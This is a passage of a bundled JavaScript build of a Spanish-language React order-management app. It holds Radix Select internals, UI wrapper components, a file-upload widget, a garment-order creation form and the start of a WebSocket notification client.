    const context = useSelectContext(ITEM_TEXT_NAME, __scopeSelect);
    const contentContext = useSelectContentContext(ITEM_TEXT_NAME, __scopeSelect);
    const itemContext = useSelectItemContext(ITEM_TEXT_NAME, __scopeSelect);
    const nativeOptionsContext = useSelectNativeOptionsContext(ITEM_TEXT_NAME, __scopeSelect);
    const [itemTextNode, setItemTextNode] = React52.useState(null);
    const composedRefs = useComposedRefs(
      forwardedRef,
      (node) => setItemTextNode(node),
      itemContext.onItemTextChange,
      (node) => contentContext.itemTextRefCallback?.(node, itemContext.value, itemContext.disabled)
    );
    const textContent = itemTextNode?.textContent;
    const nativeOption = React52.useMemo(
      () => /* @__PURE__ */ jsx32("option", { value: itemContext.value, disabled: itemContext.disabled, children: textContent }, itemContext.value),
      [itemContext.disabled, itemContext.value, textContent]
    );
    const { onNativeOptionAdd, onNativeOptionRemove } = nativeOptionsContext;
    useLayoutEffect22(() => {
      onNativeOptionAdd(nativeOption);
      return () => onNativeOptionRemove(nativeOption);
    }, [onNativeOptionAdd, onNativeOptionRemove, nativeOption]);
    return /* @__PURE__ */ jsxs9(Fragment8, { children: [
      /* @__PURE__ */ jsx32(Primitive.span, { id: itemContext.textId, ...itemTextProps, ref: composedRefs }),
      itemContext.isSelected && context.valueNode && !context.valueNodeHasChildren ? ReactDOM5.createPortal(itemTextProps.children, context.valueNode) : null
    ] });
  }
);
SelectItemText.displayName = ITEM_TEXT_NAME;
var ITEM_INDICATOR_NAME = "SelectItemIndicator";
var SelectItemIndicator = React52.forwardRef(
  (props, forwardedRef) => {
    const { __scopeSelect, ...itemIndicatorProps } = props;
    const itemContext = useSelectItemContext(ITEM_INDICATOR_NAME, __scopeSelect);
    return itemContext.isSelected ? /* @__PURE__ */ jsx32(Primitive.span, { "aria-hidden": true, ...itemIndicatorProps, ref: forwardedRef }) : null;
  }
);
SelectItemIndicator.displayName = ITEM_INDICATOR_NAME;
var SCROLL_UP_BUTTON_NAME = "SelectScrollUpButton";
var SelectScrollUpButton = React52.forwardRef((props, forwardedRef) => {
  const contentContext = useSelectContentContext(SCROLL_UP_BUTTON_NAME, props.__scopeSelect);
  const viewportContext = useSelectViewportContext(SCROLL_UP_BUTTON_NAME, props.__scopeSelect);
  const [canScrollUp, setCanScrollUp] = React52.useState(false);
  const composedRefs = useComposedRefs(forwardedRef, viewportContext.onScrollButtonChange);
  useLayoutEffect22(() => {
    if (contentContext.viewport && contentContext.isPositioned) {
      let handleScroll22 = function() {
        const canScrollUp2 = viewport.scrollTop > 0;
        setCanScrollUp(canScrollUp2);
      };
      var handleScroll2 = handleScroll22;
      const viewport = contentContext.viewport;
      handleScroll22();
      viewport.addEventListener("scroll", handleScroll22);
      return () => viewport.removeEventListener("scroll", handleScroll22);
    }
  }, [contentContext.viewport, contentContext.isPositioned]);
  return canScrollUp ? /* @__PURE__ */ jsx32(
    SelectScrollButtonImpl,
    {
      ...props,
      ref: composedRefs,
      onAutoScroll: () => {
        const { viewport, selectedItem } = contentContext;
        if (viewport && selectedItem) {
          viewport.scrollTop = viewport.scrollTop - selectedItem.offsetHeight;
        }
      }
    }
  ) : null;
});
SelectScrollUpButton.displayName = SCROLL_UP_BUTTON_NAME;
var SCROLL_DOWN_BUTTON_NAME = "SelectScrollDownButton";
var SelectScrollDownButton = React52.forwardRef((props, forwardedRef) => {
  const contentContext = useSelectContentContext(SCROLL_DOWN_BUTTON_NAME, props.__scopeSelect);
  const viewportContext = useSelectViewportContext(SCROLL_DOWN_BUTTON_NAME, props.__scopeSelect);
  const [canScrollDown, setCanScrollDown] = React52.useState(false);
  const composedRefs = useComposedRefs(forwardedRef, viewportContext.onScrollButtonChange);
  useLayoutEffect22(() => {
    if (contentContext.viewport && contentContext.isPositioned) {
      let handleScroll22 = function() {
        const maxScroll = viewport.scrollHeight - viewport.clientHeight;
        const canScrollDown2 = Math.ceil(viewport.scrollTop) < maxScroll;
        setCanScrollDown(canScrollDown2);
      };
      var handleScroll2 = handleScroll22;
      const viewport = contentContext.viewport;
      handleScroll22();
      viewport.addEventListener("scroll", handleScroll22);
      return () => viewport.removeEventListener("scroll", handleScroll22);
    }
  }, [contentContext.viewport, contentContext.isPositioned]);
  return canScrollDown ? /* @__PURE__ */ jsx32(
    SelectScrollButtonImpl,
    {
      ...props,
      ref: composedRefs,
      onAutoScroll: () => {
        const { viewport, selectedItem } = contentContext;
        if (viewport && selectedItem) {
          viewport.scrollTop = viewport.scrollTop + selectedItem.offsetHeight;
        }
      }
    }
  ) : null;
});
SelectScrollDownButton.displayName = SCROLL_DOWN_BUTTON_NAME;
var SelectScrollButtonImpl = React52.forwardRef((props, forwardedRef) => {
  const { __scopeSelect, onAutoScroll, ...scrollIndicatorProps } = props;
  const contentContext = useSelectContentContext("SelectScrollButton", __scopeSelect);
  const autoScrollTimerRef = React52.useRef(null);
  const getItems = useCollection2(__scopeSelect);
  const clearAutoScrollTimer = React52.useCallback(() => {
    if (autoScrollTimerRef.current !== null) {
      window.clearInterval(autoScrollTimerRef.current);
      autoScrollTimerRef.current = null;
    }
  }, []);
  React52.useEffect(() => {
    return () => clearAutoScrollTimer();
  }, [clearAutoScrollTimer]);
  useLayoutEffect22(() => {
    const activeItem = getItems().find((item) => item.ref.current === document.activeElement);
    activeItem?.ref.current?.scrollIntoView({ block: "nearest" });
  }, [getItems]);
  return /* @__PURE__ */ jsx32(
    Primitive.div,
    {
      "aria-hidden": true,
      ...scrollIndicatorProps,
      ref: forwardedRef,
      style: { flexShrink: 0, ...scrollIndicatorProps.style },
      onPointerDown: composeEventHandlers(scrollIndicatorProps.onPointerDown, () => {
        if (autoScrollTimerRef.current === null) {
          autoScrollTimerRef.current = window.setInterval(onAutoScroll, 50);
        }
      }),
      onPointerMove: composeEventHandlers(scrollIndicatorProps.onPointerMove, () => {
        contentContext.onItemLeave?.();
        if (autoScrollTimerRef.current === null) {
          autoScrollTimerRef.current = window.setInterval(onAutoScroll, 50);
        }
      }),
      onPointerLeave: composeEventHandlers(scrollIndicatorProps.onPointerLeave, () => {
        clearAutoScrollTimer();
      })
    }
  );
});
var SEPARATOR_NAME = "SelectSeparator";
var SelectSeparator = React52.forwardRef(
  (props, forwardedRef) => {
    const { __scopeSelect, ...separatorProps } = props;
    return /* @__PURE__ */ jsx32(Primitive.div, { "aria-hidden": true, ...separatorProps, ref: forwardedRef });
  }
);
SelectSeparator.displayName = SEPARATOR_NAME;
var ARROW_NAME3 = "SelectArrow";
var SelectArrow = React52.forwardRef(
  (props, forwardedRef) => {
    const { __scopeSelect, ...arrowProps } = props;
    const popperScope = usePopperScope2(__scopeSelect);
    const context = useSelectContext(ARROW_NAME3, __scopeSelect);
    const contentContext = useSelectContentContext(ARROW_NAME3, __scopeSelect);
    return context.open && contentContext.position === "popper" ? /* @__PURE__ */ jsx32(Arrow2, { ...popperScope, ...arrowProps, ref: forwardedRef }) : null;
  }
);
SelectArrow.displayName = ARROW_NAME3;
var BUBBLE_INPUT_NAME = "SelectBubbleInput";
var SelectBubbleInput = React52.forwardRef(
  ({ __scopeSelect, value, ...props }, forwardedRef) => {
    const ref = React52.useRef(null);
    const composedRefs = useComposedRefs(forwardedRef, ref);
    const prevValue = usePrevious(value);
    React52.useEffect(() => {
      const select = ref.current;
      if (!select) return;
      const selectProto = window.HTMLSelectElement.prototype;
      const descriptor = Object.getOwnPropertyDescriptor(
        selectProto,
        "value"
      );
      const setValue = descriptor.set;
      if (prevValue !== value && setValue) {
        const event = new Event("change", { bubbles: true });
        setValue.call(select, value);
        select.dispatchEvent(event);
      }
    }, [prevValue, value]);
    return /* @__PURE__ */ jsx32(
      Primitive.select,
      {
        ...props,
        style: { ...VISUALLY_HIDDEN_STYLES, ...props.style },
        ref: composedRefs,
        defaultValue: value
      }
    );
  }
);
SelectBubbleInput.displayName = BUBBLE_INPUT_NAME;
function shouldShowPlaceholder(value) {
  return value === "" || value === void 0;
}
function useTypeaheadSearch(onSearchChange) {
  const handleSearchChange = useCallbackRef(onSearchChange);
  const searchRef = React52.useRef("");
  const timerRef = React52.useRef(0);
  const handleTypeaheadSearch = React52.useCallback(
    (key) => {
      const search = searchRef.current + key;
      handleSearchChange(search);
      (function updateSearch(value) {
        searchRef.current = value;
        window.clearTimeout(timerRef.current);
        if (value !== "") timerRef.current = window.setTimeout(() => updateSearch(""), 1e3);
      })(search);
    },
    [handleSearchChange]
  );
  const resetTypeahead = React52.useCallback(() => {
    searchRef.current = "";
    window.clearTimeout(timerRef.current);
  }, []);
  React52.useEffect(() => {
    return () => window.clearTimeout(timerRef.current);
  }, []);
  return [searchRef, handleTypeaheadSearch, resetTypeahead];
}
function findNextItem(items, search, currentItem) {
  const isRepeated = search.length > 1 && Array.from(search).every((char) => char === search[0]);
  const normalizedSearch = isRepeated ? search[0] : search;
  const currentItemIndex = currentItem ? items.indexOf(currentItem) : -1;
  let wrappedItems = wrapArray(items, Math.max(currentItemIndex, 0));
  const excludeCurrentItem = normalizedSearch.length === 1;
  if (excludeCurrentItem) wrappedItems = wrappedItems.filter((v) => v !== currentItem);
  const nextItem = wrappedItems.find(
    (item) => item.textValue.toLowerCase().startsWith(normalizedSearch.toLowerCase())
  );
  return nextItem !== currentItem ? nextItem : void 0;
}
function wrapArray(array, startIndex) {
  return array.map((_, index2) => array[(startIndex + index2) % array.length]);
}
var Root24 = Select;
var Trigger3 = SelectTrigger;
var Value = SelectValue;
var Icon2 = SelectIcon;
var Portal3 = SelectPortal;
var Content22 = SelectContent;
var Viewport2 = SelectViewport;
var Label3 = SelectLabel;
var Item = SelectItem;
var ItemText = SelectItemText;
var ItemIndicator = SelectItemIndicator;
var ScrollUpButton = SelectScrollUpButton;
var ScrollDownButton = SelectScrollDownButton;
var Separator = SelectSeparator;

// client/src/components/ui/select.tsx
import { jsx as jsx33, jsxs as jsxs10 } from "react/jsx-runtime";
var Select2 = Root24;
var SelectValue2 = Value;
var SelectTrigger2 = React53.forwardRef(({ className, children, ...props }, ref) => /* @__PURE__ */ jsxs10(
  Trigger3,
  {
    ref,
    className: cn(
      "flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background data-[placeholder]:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 [&>span]:line-clamp-1",
      className
    ),
    ...props,
    children: [
      children,
      /* @__PURE__ */ jsx33(Icon2, { asChild: true, children: /* @__PURE__ */ jsx33(ChevronDown, { className: "h-4 w-4 opacity-50" }) })
    ]
  }
));
SelectTrigger2.displayName = Trigger3.displayName;
var SelectScrollUpButton2 = React53.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx33(
  ScrollUpButton,
  {
    ref,
    className: cn(
      "flex cursor-default items-center justify-center py-1",
      className
    ),
    ...props,
    children: /* @__PURE__ */ jsx33(ChevronUp, { className: "h-4 w-4" })
  }
));
SelectScrollUpButton2.displayName = ScrollUpButton.displayName;
var SelectScrollDownButton2 = React53.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx33(
  ScrollDownButton,
  {
    ref,
    className: cn(
      "flex cursor-default items-center justify-center py-1",
      className
    ),
    ...props,
    children: /* @__PURE__ */ jsx33(ChevronDown, { className: "h-4 w-4" })
  }
));
SelectScrollDownButton2.displayName = ScrollDownButton.displayName;
var SelectContent2 = React53.forwardRef(({ className, children, position = "popper", ...props }, ref) => /* @__PURE__ */ jsx33(Portal3, { children: /* @__PURE__ */ jsxs10(
  Content22,
  {
    ref,
    className: cn(
      "relative z-50 max-h-[--radix-select-content-available-height] min-w-[8rem] overflow-y-auto overflow-x-hidden rounded-md border bg-popover text-popover-foreground shadow-md data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2 origin-[--radix-select-content-transform-origin]",
      position === "popper" && "data-[side=bottom]:translate-y-1 data-[side=left]:-translate-x-1 data-[side=right]:translate-x-1 data-[side=top]:-translate-y-1",
      className
    ),
    position,
    ...props,
    children: [
      /* @__PURE__ */ jsx33(SelectScrollUpButton2, {}),
      /* @__PURE__ */ jsx33(
        Viewport2,
        {
          className: cn(
            "p-1",
            position === "popper" && "h-[var(--radix-select-trigger-height)] w-full min-w-[var(--radix-select-trigger-width)]"
          ),
          children
        }
      ),
      /* @__PURE__ */ jsx33(SelectScrollDownButton2, {})
    ]
  }
) }));
SelectContent2.displayName = Content22.displayName;
var SelectLabel2 = React53.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx33(
  Label3,
  {
    ref,
    className: cn("py-1.5 pl-8 pr-2 text-sm font-semibold", className),
    ...props
  }
));
SelectLabel2.displayName = Label3.displayName;
var SelectItem2 = React53.forwardRef(({ className, children, ...props }, ref) => /* @__PURE__ */ jsxs10(
  Item,
  {
    ref,
    className: cn(
      "relative flex w-full cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50",
      className
    ),
    ...props,
    children: [
      /* @__PURE__ */ jsx33("span", { className: "absolute left-2 flex h-3.5 w-3.5 items-center justify-center", children: /* @__PURE__ */ jsx33(ItemIndicator, { children: /* @__PURE__ */ jsx33(Check, { className: "h-4 w-4" }) }) }),
      /* @__PURE__ */ jsx33(ItemText, { children })
    ]
  }
));
SelectItem2.displayName = Item.displayName;
var SelectSeparator2 = React53.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx33(
  Separator,
  {
    ref,
    className: cn("-mx-1 my-1 h-px bg-muted", className),
    ...props
  }
));
SelectSeparator2.displayName = Separator.displayName;

// client/src/components/ui/file-upload.tsx
import { useRef as useRef18, useState as useState21 } from "react";

// client/src/components/ui/card.tsx
import * as React54 from "react";
import { jsx as jsx34 } from "react/jsx-runtime";
var Card = React54.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx34(
  "div",
  {
    ref,
    className: cn(
      "rounded-lg border bg-card text-card-foreground shadow-sm",
      className
    ),
    ...props
  }
));
Card.displayName = "Card";
var CardHeader = React54.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx34(
  "div",
  {
    ref,
    className: cn("flex flex-col space-y-1.5 p-6", className),
    ...props
  }
));
CardHeader.displayName = "CardHeader";
var CardTitle = React54.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx34(
  "div",
  {
    ref,
    className: cn(
      "text-2xl font-semibold leading-none tracking-tight",
      className
    ),
    ...props
  }
));
CardTitle.displayName = "CardTitle";
var CardDescription = React54.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx34(
  "div",
  {
    ref,
    className: cn("text-sm text-muted-foreground", className),
    ...props
  }
));
CardDescription.displayName = "CardDescription";
var CardContent = React54.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx34("div", { ref, className: cn("p-6 pt-0", className), ...props }));
CardContent.displayName = "CardContent";
var CardFooter = React54.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx34(
  "div",
  {
    ref,
    className: cn("flex items-center p-6 pt-0", className),
    ...props
  }
));
CardFooter.displayName = "CardFooter";

// client/src/components/ui/file-upload.tsx
import { jsx as jsx35, jsxs as jsxs11 } from "react/jsx-runtime";
function FileUpload({
  onFileSelect,
  acceptedTypes = ".pdf,.xml,.jpg,.jpeg,.png",
  maxFiles = 3,
  maxSize = 10,
  label = "Documentos",
  description = "Selecciona archivos PDF, XML o im\xE1genes"
}) {
  const [selectedFiles, setSelectedFiles] = useState21([]);
  const [errors, setErrors] = useState21([]);
  const fileInputRef = useRef18(null);
  const handleFileSelect = (event) => {
    const files = Array.from(event.target.files || []);
    const newErrors = [];
    if (files.length > maxFiles) {
      newErrors.push(`M\xE1ximo ${maxFiles} archivos permitidos`);
      return;
    }
    const validFiles = files.filter((file) => {
      const fileType = file.name.toLowerCase();
      const isValidType = fileType.endsWith(".pdf") || fileType.endsWith(".xml") || fileType.endsWith(".jpg") || fileType.endsWith(".jpeg") || fileType.endsWith(".png");
      const isValidSize = file.size <= maxSize * 1024 * 1024;
      if (!isValidType) {
        newErrors.push(`${file.name}: Solo se permiten archivos PDF, XML y im\xE1genes (JPG, PNG, JPEG)`);
        return false;
      }
      if (!isValidSize) {
        newErrors.push(`${file.name}: El archivo debe ser menor a ${maxSize}MB`);
        return false;
      }
      return true;
    });
    setErrors(newErrors);
    setSelectedFiles(validFiles);
    onFileSelect(validFiles);
  };
  const removeFile = (index2) => {
    const newFiles = selectedFiles.filter((_, i) => i !== index2);
    setSelectedFiles(newFiles);
    onFileSelect(newFiles);
  };
  const formatFileSize = (bytes) => {
    if (bytes === 0) return "0 Bytes";
    const k = 1024;
    const sizes = ["Bytes", "KB", "MB"];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i];
  };
  return /* @__PURE__ */ jsxs11("div", { className: "space-y-4", children: [
    /* @__PURE__ */ jsxs11("div", { children: [
      /* @__PURE__ */ jsx35(Label2, { children: label }),
      /* @__PURE__ */ jsx35("p", { className: "text-sm text-gray-500", children: description })
    ] }),
    /* @__PURE__ */ jsxs11("div", { className: "border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:border-gray-400 transition-colors", children: [
      /* @__PURE__ */ jsx35(
        Input,
        {
          ref: fileInputRef,
          type: "file",
          multiple: true,
          accept: acceptedTypes,
          onChange: handleFileSelect,
          className: "hidden"
        }
      ),
      /* @__PURE__ */ jsx35(Upload, { className: "mx-auto h-12 w-12 text-gray-400 mb-4" }),
      /* @__PURE__ */ jsx35("p", { className: "text-sm text-gray-600 mb-2", children: "Arrastra archivos aqu\xED o haz clic para seleccionar" }),
      /* @__PURE__ */ jsx35(
        Button,
        {
          type: "button",
          variant: "outline",
          onClick: () => fileInputRef.current?.click(),
          children: "Seleccionar Archivos"
        }
      ),
      /* @__PURE__ */ jsxs11("p", { className: "text-xs text-gray-400 mt-2", children: [
        "PDF, XML, JPG, PNG, JPEG hasta ",
        maxSize,
        "MB cada uno (m\xE1ximo ",
        maxFiles,
        " archivos)"
      ] })
    ] }),
    errors.length > 0 && /* @__PURE__ */ jsx35("div", { className: "space-y-2", children: errors.map((error, index2) => /* @__PURE__ */ jsxs11("div", { className: "flex items-center gap-2 text-red-600 text-sm", children: [
      /* @__PURE__ */ jsx35(CircleAlert, { className: "h-4 w-4" }),
      error
    ] }, index2)) }),
    selectedFiles.length > 0 && /* @__PURE__ */ jsxs11("div", { className: "space-y-2", children: [
      /* @__PURE__ */ jsx35(Label2, { children: "Archivos seleccionados:" }),
      selectedFiles.map((file, index2) => /* @__PURE__ */ jsx35(Card, { children: /* @__PURE__ */ jsx35(CardContent, { className: "p-3", children: /* @__PURE__ */ jsxs11("div", { className: "flex items-center justify-between", children: [
        /* @__PURE__ */ jsxs11("div", { className: "flex items-center gap-3", children: [
          /* @__PURE__ */ jsx35(File, { className: "h-5 w-5 text-blue-500" }),
          /* @__PURE__ */ jsxs11("div", { children: [
            /* @__PURE__ */ jsx35("p", { className: "text-sm font-medium", children: file.name }),
            /* @__PURE__ */ jsx35("p", { className: "text-xs text-gray-500", children: formatFileSize(file.size) })
          ] })
        ] }),
        /* @__PURE__ */ jsx35(
          Button,
          {
            type: "button",
            variant: "ghost",
            size: "sm",
            onClick: () => removeFile(index2),
            children: /* @__PURE__ */ jsx35(X, { className: "h-4 w-4" })
          }
        )
      ] }) }) }, index2))
    ] })
  ] });
}

// client/src/components/orders/create-order-modal.tsx
var import_sweetalert22 = __toESM(require_sweetalert2_all(), 1);
import { jsx as jsx36, jsxs as jsxs12 } from "react/jsx-runtime";
function CreateOrderModal({ open, onClose }) {
  const { toast: toast2 } = useToast();
  const queryClient2 = useQueryClient();
  const [formData, setFormData] = useState22({
    folio: "",
    clienteHotel: "",
    noSolicitud: "",
    noHoja: "",
    modelo: "",
    tipoPrenda: "",
    color: "",
    tela: "",
    totalPiezas: ""
  });
  const [selectedFiles, setSelectedFiles] = useState22([]);
  const createOrderMutation = useMutation({
    mutationFn: async (data) => {
      const formDataToSend = new FormData();
      Object.keys(data).forEach((key) => {
        if (key === "totalPiezas") {
          formDataToSend.append(key, parseInt(data[key]).toString());
        } else {
          formDataToSend.append(key, data[key]);
        }
      });
      selectedFiles.forEach((file, index2) => {
        formDataToSend.append(`documents`, file);
      });
      const res = await fetch("/api/orders", {
        method: "POST",
        body: formDataToSend
      });
      if (!res.ok) {
        throw new Error("Error al crear el pedido");
      }
      return await res.json();
    },
    onSuccess: () => {
      import_sweetalert22.default.fire({
        title: "\xA1Pedido creado!",
        text: "El pedido ha sido creado exitosamente.",
        icon: "success",
        confirmButtonText: "Aceptar",
        customClass: {
          popup: "font-sans"
        }
      });
      queryClient2.invalidateQueries({ queryKey: ["/api/orders"] });
      queryClient2.invalidateQueries({ queryKey: ["/api/dashboard/stats"] });
      onClose();
      setFormData({
        folio: "",
        clienteHotel: "",
        noSolicitud: "",
        noHoja: "",
        modelo: "",
        tipoPrenda: "",
        color: "",
        tela: "",
        totalPiezas: ""
      });
      setSelectedFiles([]);
    },
    onError: (error) => {
      toast2({
        title: "Error al crear pedido",
        description: error.message,
        variant: "destructive"
      });
    }
  });
  const handleSubmit = (e) => {
    e.preventDefault();
    createOrderMutation.mutate(formData);
  };
  const handleChange = (field, value) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
  };
  return /* @__PURE__ */ jsx36(Dialog2, { open, onOpenChange: onClose, children: /* @__PURE__ */ jsxs12(DialogContent2, { className: "max-w-2xl max-h-[90vh] overflow-y-auto", children: [
    /* @__PURE__ */ jsx36(DialogHeader, { children: /* @__PURE__ */ jsx36(DialogTitle2, { children: "Crear Nuevo Pedido" }) }),
    /* @__PURE__ */ jsxs12("form", { onSubmit: handleSubmit, children: [
      /* @__PURE__ */ jsxs12("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-4", children: [
        /* @__PURE__ */ jsxs12("div", { children: [
          /* @__PURE__ */ jsx36(Label2, { htmlFor: "folio", children: "Folio *" }),
          /* @__PURE__ */ jsx36(
            Input,
            {
              id: "folio",
              placeholder: "Ejp: 2025-001",
              value: formData.folio,
              onChange: (e) => handleChange("folio", e.target.value),
              required: true
            }
          )
        ] }),
        /* @__PURE__ */ jsxs12("div", { children: [
          /* @__PURE__ */ jsx36(Label2, { htmlFor: "clienteHotel", children: "Cliente/Hotel *" }),
          /* @__PURE__ */ jsx36(
            Input,
            {
              id: "clienteHotel",
              placeholder: "Nombre del hotel",
              value: formData.clienteHotel,
              onChange: (e) => handleChange("clienteHotel", e.target.value),
              required: true
            }
          )
        ] }),
        /* @__PURE__ */ jsxs12("div", { children: [
          /* @__PURE__ */ jsx36(Label2, { htmlFor: "noSolicitud", children: "No. Solicitud *" }),
          /* @__PURE__ */ jsx36(
            Input,
            {
              id: "noSolicitud",
              placeholder: "JN-SOL-MM-AA-XXX",
              value: formData.noSolicitud,
              onChange: (e) => handleChange("noSolicitud", e.target.value),
              required: true
            }
          )
        ] }),
        /* @__PURE__ */ jsxs12("div", { children: [
          /* @__PURE__ */ jsx36(Label2, { htmlFor: "noHoja", children: "No. Hoja" }),
          /* @__PURE__ */ jsx36(
            Input,
            {
              id: "noHoja",
              placeholder: "N\xB0 Hoja pedido",
              value: formData.noHoja,
              onChange: (e) => handleChange("noHoja", e.target.value)
            }
          )
        ] }),
        /* @__PURE__ */ jsxs12("div", { children: [
          /* @__PURE__ */ jsx36(Label2, { htmlFor: "modelo", children: "Modelo *" }),
          /* @__PURE__ */ jsx36(
            Input,
            {
              id: "modelo",
              placeholder: "Modelo de la prenda",
              value: formData.modelo,
              onChange: (e) => handleChange("modelo", e.target.value),
              required: true
            }
          )
        ] }),
        /* @__PURE__ */ jsxs12("div", { children: [
          /* @__PURE__ */ jsx36(Label2, { htmlFor: "tipoPrenda", children: "Tipo de Prenda *" }),
          /* @__PURE__ */ jsxs12(Select2, { value: formData.tipoPrenda, onValueChange: (value) => handleChange("tipoPrenda", value), children: [
            /* @__PURE__ */ jsx36(SelectTrigger2, { children: /* @__PURE__ */ jsx36(SelectValue2, { placeholder: "Seleccionar tipo..." }) }),
            /* @__PURE__ */ jsxs12(SelectContent2, { children: [
              /* @__PURE__ */ jsx36(SelectItem2, { value: "camisa", children: "Camisa" }),
              /* @__PURE__ */ jsx36(SelectItem2, { value: "blusa", children: "Blusa" }),
              /* @__PURE__ */ jsx36(SelectItem2, { value: "pantalon", children: "Pantal\xF3n" }),
              /* @__PURE__ */ jsx36(SelectItem2, { value: "short", children: "Short" }),
              /* @__PURE__ */ jsx36(SelectItem2, { value: "falda", children: "Falda" }),
              /* @__PURE__ */ jsx36(SelectItem2, { value: "vestido", children: "Vestido" }),
              /* @__PURE__ */ jsx36(SelectItem2, { value: "saco", children: "Saco" }),
              /* @__PURE__ */ jsx36(SelectItem2, { value: "chaleco", children: "Chaleco" }),
              /* @__PURE__ */ jsx36(SelectItem2, { value: "mandil", children: "Mandil" }),
              /* @__PURE__ */ jsx36(SelectItem2, { value: "fajo", children: "Fajo" })
            ] })
          ] })
        ] }),
        /* @__PURE__ */ jsxs12("div", { children: [
          /* @__PURE__ */ jsx36(Label2, { htmlFor: "color", children: "Color *" }),
          /* @__PURE__ */ jsx36(
            Input,
            {
              id: "color",
              placeholder: "Color de la tela",
              value: formData.color,
              onChange: (e) => handleChange("color", e.target.value),
              required: true
            }
          )
        ] }),
        /* @__PURE__ */ jsxs12("div", { children: [
          /* @__PURE__ */ jsx36(Label2, { htmlFor: "tela", children: "Tela *" }),
          /* @__PURE__ */ jsx36(
            Input,
            {
              id: "tela",
              placeholder: "Nombre de tela",
              value: formData.tela,
              onChange: (e) => handleChange("tela", e.target.value),
              required: true
            }
          )
        ] }),
        /* @__PURE__ */ jsxs12("div", { className: "md:col-span-2", children: [
          /* @__PURE__ */ jsx36(Label2, { htmlFor: "totalPiezas", children: "Total de Piezas *" }),
          /* @__PURE__ */ jsx36(
            Input,
            {
              id: "totalPiezas",
              type: "number",
              min: "1",
              placeholder: "Cantidad total",
              value: formData.totalPiezas,
              onChange: (e) => handleChange("totalPiezas", e.target.value),
              required: true
            }
          )
        ] }),
        /* @__PURE__ */ jsx36("div", { className: "md:col-span-2", children: /* @__PURE__ */ jsx36(
          FileUpload,
          {
            onFileSelect: setSelectedFiles,
            label: "Documentos del Pedido",
            description: "Adjunta documentos relacionados con el pedido (PDF, XML)",
            maxFiles: 5,
            maxSize: 10
          }
        ) })
      ] }),
      /* @__PURE__ */ jsxs12("div", { className: "flex justify-end space-x-3 mt-6", children: [
        /* @__PURE__ */ jsx36(Button, { type: "button", variant: "outline", onClick: onClose, children: "Cancelar" }),
        /* @__PURE__ */ jsxs12(Button, { type: "submit", disabled: createOrderMutation.isPending, children: [
          createOrderMutation.isPending && /* @__PURE__ */ jsx36(LoaderCircle, { className: "mr-2 h-4 w-4 animate-spin" }),
          "Crear Pedido"
        ] })
      ] })
    ] })
  ] }) });
}

// client/src/lib/websocket.ts
import { useEffect as useEffect24, useRef as useRef19, useState as useState23 } from "react";
var WebSocketManager = class {
  ws = null;
  reconnectAttempts = 0;
  maxReconnectAttempts = 5;
  reconnectInterval = 5e3;
  listeners = [];
  connect() {
    try {
      const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
      const host = window.location.host;
      const wsUrl = `${protocol}//${host}/ws`;
      console.log("Intentando conectar WebSocket a:", wsUrl);
      this.ws = new WebSocket(wsUrl);
      this.ws.onopen = () => {
        console.log("WebSocket conectado exitosamente");
        this.reconnectAttempts = 0;
      };
      this.ws.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          console.log("Notificaci\xF3n WebSocket recibida:", data);
          if (data.type === "notification") {
            this.listeners.forEach((listener) => listener(data.data));
          }
        } catch (error) {
          console.error("Error al procesar mensaje WebSocket:", error);
        }
      };
      this.ws.onclose = (event) => {
        console.log("WebSocket desconectado, c\xF3digo:", event.code);
        this.attemptReconnect();
      };
      this.ws.onerror = (error) => {
        console.error("Error en WebSocket:", error);
      };
    } catch (error) {
      console.error("Error al crear WebSocket:", error);
      this.attemptReconnect();
    }
  }
  attemptReconnect() {
    if (this.reconnectAttempts < this.maxReconnectAttempts) {
      this.reconnectAttempts++;
      console.log(`Intentando reconectar WebSocket en ${this.reconnectInterval / 1e3} segundos... (Intento ${this.reconnectAttempts}/${this.maxReconnectAttempts})`);
      setTimeout(() => {
        this.connect();
      }, this.reconnectInterval);
    } else {
      console.error("M\xE1ximo n\xFAmero de intentos de reconexi\xF3n alcanzado.");
    }
  }
  sendMessage(message2) {
    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify(message2));
    } else {
      console.warn("WebSocket no est\xE1 conectado, mensaje no enviado:", message2);
    }
  }
  addListener(listener) {
    this.listeners.push(listener);
  }
  removeListener(listener) {
    this.listeners = this.listeners.filter((l) => l !== listener);
  }
};
function useWebSocket() {
  const ws = useRef19(null);
  const [isConnected, setIsConnected] = useState23(false);
  const queryClient2 = useQueryClient();
  const webSocketManagerRef = useRef19(null);
  useEffect24(() => {
    if (!webSocketManagerRef.current) {
      webSocketManagerRef.current = new WebSocketManager();
    }
    const webSocketManager = webSocketManagerRef.current;
    webSocketManager.connect();
    setIsConnected(true);
    const notificationListener = (notification) => {
      console.log("Nueva notificaci\xF3n recibida:", notification);
      queryClient2.invalidateQueries();
      queryClient2.refetchQueries();
